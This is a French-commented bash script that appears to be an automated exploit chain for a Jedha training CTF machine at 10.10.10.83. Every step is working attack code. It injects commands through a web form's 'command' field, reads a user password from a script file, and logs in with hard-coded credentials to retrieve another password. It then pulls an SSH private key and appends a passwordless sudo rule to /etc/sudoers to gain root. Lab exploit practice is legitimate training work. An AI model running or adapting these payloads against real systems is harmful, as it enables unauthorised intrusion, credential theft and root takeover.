#!/bin/bash
# Jedha CTF - Script d'exploitation automatisé
# Cible : 10.10.10.83

TARGET="10.10.10.83"
LHOST="${LHOST:-$(hostname -I | awk '{print $1}')}"

echo "[*] Script d'exploitation Jedha CTF"
echo "[*] Cible : $TARGET"
echo ""

# Couleurs
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

# Étape 1 : Injection de commande pour vérifier le RCE
echo -e "${YELLOW}[1/6] Test d'injection de commande sur le port 80...${NC}"
RCE_TEST=$(curl -s -X POST "http://$TARGET/" --data-urlencode "command=127.0.0.1;id" | grep -o "uid=[0-9]*")
if [[ "$RCE_TEST" == *"uid="* ]]; then
    echo -e "${GREEN}[+] Injection de commande confirmée !${NC}"
else
    echo -e "${RED}[-] Injection de commande échouée. Arrêt.${NC}"
    exit 1
fi

# Étape 2 : Extraction des identifiants de john depuis /run/john-script.sh
echo -e "${YELLOW}[2/6] Extraction des identifiants de john...${NC}"
JOHN_PASS=$(curl -s -X POST "http://$TARGET/" --data-urlencode "command=127.0.0.1;cat /run/john-script.sh" | grep -oP 'PASSWD="\K[^"]+')
if [[ -n "$JOHN_PASS" ]]; then
    echo -e "${GREEN}[+] Mot de passe de john : $JOHN_PASS${NC}"
else
    echo -e "${RED}[-] Impossible d'extraire le mot de passe de john${NC}"
    exit 1
fi

# Étape 3 : Récupération du mot de passe de bob depuis Evil CORP
echo -e "${YELLOW}[3/6] Extraction du mot de passe de bob depuis Evil CORP...${NC}"
BOB_PASS=$(curl -s -X POST "http://$TARGET:8081/login" -d "username=evil&password=VeryStr0ngP4ssw0rd" | grep -oP 'password : \K[^<]+')
if [[ -n "$BOB_PASS" ]]; then
    echo -e "${GREEN}[+] Mot de passe de bob : $BOB_PASS${NC}"
else
    echo -e "${RED}[-] Impossible d'extraire le mot de passe de bob${NC}"
fi

# Étape 4 : Extraction de la clé SSH d'alice
echo -e "${YELLOW}[4/6] Extraction de la clé SSH d'alice...${NC}"
curl -s -X POST "http://$TARGET/" --data-urlencode "command=127.0.0.1;cat /var/ftp/alice/files/id_rsa" | \
    grep -A 100 "BEGIN OPENSSH" | grep -B 100 "END OPENSSH" > /tmp/alice_key_jedha
chmod 600 /tmp/alice_key_jedha

if [[ -s /tmp/alice_key_jedha ]]; then
    echo -e "${GREEN}[+] Clé SSH d'alice sauvegardée dans /tmp/alice_key_jedha${NC}"
else
    echo -e "${RED}[-] Impossible d'extraire la clé SSH d'alice${NC}"
fi

# Étape 5 : SSH en tant qu'alice et élévation vers root
echo -e "${YELLOW}[5/6] Connexion en tant qu'alice et élévation vers root...${NC}"
echo -e "${YELLOW}[*] Ajout d'alice aux sudoers...${NC}"

ssh -o StrictHostKeyChecking=no -i /tmp/alice_key_jedha alice@$TARGET \
    'echo "alice ALL=(ALL) NOPASSWD: ALL" | sudo /usr/bin/tee -a /etc/sudoers' 2>/dev/null

# Étape 6 : Vérification de l'accès root
echo -e "${YELLOW}[6/6] Vérification de l'accès root...${NC}"
ROOT_CHECK=$(ssh -o StrictHostKeyChecking=no -i /tmp/alice_key_jedha alice@$TARGET 'sudo id' 2>/dev/null)

if [[ "$ROOT_CHECK" == *"uid=0(root)"* ]]; then
    echo -e "${GREEN}[+] ACCÈS ROOT OBTENU !${NC}"
    echo ""
    echo -e "${GREEN}========================================${NC}"
    echo -e "${GREEN}  Exploitation terminée !${NC}"
    echo -e "${GREEN}========================================${NC}"
    echo ""
    echo "Identifiants trouvés :"
    echo "  - john:$JOHN_PASS"
    echo "  - bob:$BOB_PASS"
    echo "  - alice: Clé SSH dans /tmp/alice_key_jedha"
    echo ""
    echo "Pour obtenir un shell root :"
    echo "  ssh -i /tmp/alice_key_jedha alice@$TARGET"
    echo "  sudo su"
else
    echo -e "${RED}[-] Élévation de privilèges échouée${NC}"
fi
